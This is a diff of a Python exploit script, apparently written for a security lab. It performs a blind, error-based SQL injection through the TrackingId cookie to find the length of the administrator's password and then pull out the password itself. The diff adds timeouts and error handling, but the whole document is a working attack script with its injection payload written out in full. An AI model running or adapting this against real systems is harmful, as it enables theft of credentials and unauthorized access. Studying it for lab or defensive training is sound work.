@@ -4,16 +4,31 @@ import string
 from requests.adapters import HTTPAdapter, Retry
 
 
-
 def enumerate_password_length(url, session):
-    password_length = 0
-    for i in range(1, 50):
-        payload = f"TrackingId=abc'||(SELECT CASE WHEN LENGTH(password)={i} THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'"
-        response = session.get(url, cookies={"TrackingId": payload})
-        if response.status_code == 200:
-            password_length = i
-            break
-    return password_length
+    try:
+        password_length = 0
+        for i in range(1, 50):
+            payload = f"TrackingId='||(SELECT CASE WHEN LENGTH(password)={i} THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'"
+            response = session.get(url, cookies={"TrackingId": payload}, timeout=10)
+            if response.status_code == 200:
+                password_length = i
+                break
+        if password_length > 1:
+            return password_length
+        else:
+            return None
+
+    except requests.exceptions.MissingSchema:
+        print("(-) Please enter a valid URL.")
+        sys.exit(1)
+
+    except requests.exceptions.Timeout:
+        print("(-) Request timed out.")
+        sys.exit(1)
+
+    except requests.exceptions.ConnectionError:
+        print("(-) Unable to connect to host. Please check your URL and try again.")
+        sys.exit(1)
 
 
 def enumerate_password(url,session, length):
@@ -32,7 +47,6 @@ def enumerate_password(url,session, length):
                 print("\r" + password + j, end="", flush=True)
 
 
-
 def main():
     if len(sys.argv) != 2:
         print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
@@ -45,7 +59,11 @@ def main():
 
     print("(+) Enumerating password length... ")
     password_length = enumerate_password_length(url, session)
-    print(f"(+) Password length: {password_length}")
+    if password_length:
+        print(f"(+) Password Length: {password_length} characters ")
+    else:
+        print("(-) Something went wrong. Please check your URL and try again.")
+        sys.exit(1)
     enumerate_password(url, session, password_length)
     print()
 
